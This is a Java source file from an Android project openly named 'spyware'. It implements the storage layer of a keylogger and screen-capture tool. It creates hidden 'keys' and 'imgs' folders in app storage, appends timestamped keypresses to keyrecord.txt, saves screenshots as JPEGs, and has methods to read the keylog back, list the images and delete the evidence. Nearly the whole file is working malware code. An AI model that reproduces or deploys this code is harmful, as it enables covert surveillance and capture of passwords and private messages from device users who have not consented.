package com.example.cristianturetta.spyware;

import android.content.Context;
import android.graphics.Bitmap;
import android.os.Build;
import android.os.Environment;
import android.support.annotation.RequiresApi;
import android.util.Log;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Locale;

import static android.content.Context.MODE_PRIVATE;

public class FileUtil {

    private File malwareKeypressStorageFolder;
    private File malwareImagesStorageFolder;
    private final String keypressFileName = "keyrecord.txt";
    private Context context;

    private static FileUtil mInstance;

    private FileUtil() {
    }



    private FileUtil(Context context) {
        this.context=context;
        try (FileOutputStream fileOuputStream = context.openFileOutput("a", MODE_PRIVATE)) {
            malwareKeypressStorageFolder = new File(context.getFilesDir(),
                    "keys");
            malwareImagesStorageFolder = new File(context.getFilesDir(),
                    "imgs");

            if(!malwareKeypressStorageFolder.exists())
                if (FileUtil.isExternalStorageWritable())
                    if (!malwareKeypressStorageFolder.mkdirs()) {
                        Log.e("FileUtil", "Key directory not created");
                    }

            if(!malwareImagesStorageFolder.exists())
                if (FileUtil.isExternalStorageWritable())
                    if (!malwareImagesStorageFolder.mkdirs()) {
                        Log.e("FileUtil", "Key directory not created");
                    }

        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }







    }


    public static FileUtil getInstance() {
        if (mInstance != null) {
            synchronized (FileUtil.class) {
                if (mInstance != null) {
                    return mInstance;
                }
            }
        }
        return null;
    }

    public static FileUtil init(Context context) {
        if (mInstance == null) {
            synchronized (FileUtil.class) {
                if (mInstance == null) {
                    mInstance = new FileUtil(context);
                }
            }
        }
        return mInstance;
    }





    private static boolean isExternalStorageWritable() {
        String state = Environment.getExternalStorageState();
        if (Environment.MEDIA_MOUNTED.equals(state)) {
            return true;
        }
        return false;
    }

    public File getMalwareKeypressStorageFolder() {
        return malwareKeypressStorageFolder;
    }

    public File getMalwareImagesStorageFolder() {
        return malwareImagesStorageFolder;
    }

    public String getKeypressFileName() {
        return keypressFileName;
    }

    /**
     * Stores the given {@link Bitmap} to a path on the device.
     *
     * @param bitmap   The {@link Bitmap} that needs to be stored
     * @param filePath The path in which the bitmap is going to be stored.
     */
    public void storeBitmap(Bitmap bitmap, String filePath) {
        File imageFile = new File(filePath);
        imageFile.getParentFile().mkdirs();
        try {
            OutputStream outputStream = new FileOutputStream(imageFile);
            bitmap.compress(Bitmap.CompressFormat.JPEG, 90, outputStream);
            outputStream.flush();
            outputStream.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /**
     * Stores the keypresses into malware root folder
     *
     * @param key the keypress to store
     */
    public void storeKeypress(String key) {
        DateFormat df = new SimpleDateFormat("dd/MM/yyyy-HH:mm:ss z :", Locale.ITALIAN);
        String time = df.format(Calendar.getInstance().getTime());

        // TODO check if keypressFileName exists


        try {
            File keypressFile = new File(malwareKeypressStorageFolder, keypressFileName);

            if(!malwareKeypressStorageFolder.exists()){
                throw new FileNotFoundException();
            }

            FileWriter writer;

            String toWrite = time + key;

            writer = new FileWriter(keypressFile, true);
            writer.append(toWrite);
            writer.flush();
            writer.close();
        } catch (Exception e) {
            Log.e("storeKeypress", e.getLocalizedMessage());
        }
    }

    public void deleteKeypressFile() {
        File keypressFile = new File(malwareKeypressStorageFolder, keypressFileName);

        if(keypressFile.exists())
            keypressFile.delete();
    }

    public void deleteScreenshotFiles(){
        File[] files = malwareImagesStorageFolder.listFiles();

        for (int i = 0; i < files.length; i++)
        {
            if(files[i].exists())
                files[i].delete();
        }
    }

    public void deleteAllFiles(){
        deleteKeypressFile();
        deleteScreenshotFiles();
    }

    private static String convertStreamToString(InputStream is) throws Exception {
        BufferedReader reader = new BufferedReader(new InputStreamReader(is));
        StringBuilder sb = new StringBuilder();
        String line = null;
        while ((line = reader.readLine()) != null) {
            sb.append(line).append("\n");
        }
        reader.close();
        return sb.toString();
    }

    public String getStringFromKeypressFile() {
        try {
            File fl = new File(malwareKeypressStorageFolder, keypressFileName);

            if(!fl.exists()){
                throw new FileNotFoundException();
            }

            FileInputStream fin = new FileInputStream(fl);
            String ret = convertStreamToString(fin);
            //Make sure you close all streams.
            fin.close();
            return ret;
        } catch (FileNotFoundException e) {
            //Log.e("getStringFromKeypress", e.getLocalizedMessage());
        } catch (IOException e) {
            Log.e("getStringFromKeypress", e.getLocalizedMessage());
        } catch (Exception e) {
            Log.e("getStringFromKeypress", e.getLocalizedMessage());
        }
        return null;
    }

    /**
     * Gives an {@link ArrayList<File>} of JPG images.
     *
     * @param path The {@link File} of the directory containing screenshots
     */
    public ArrayList<File> getAllImagesFrom(File path) {
        File[] allFiles = path.listFiles();
        ArrayList<File> allImages = new ArrayList<>();
        for (File file : allFiles) {
            if (file.getName().endsWith(".jpg")) {
                allImages.add(file);
            }
        }
        return allImages;
    }
}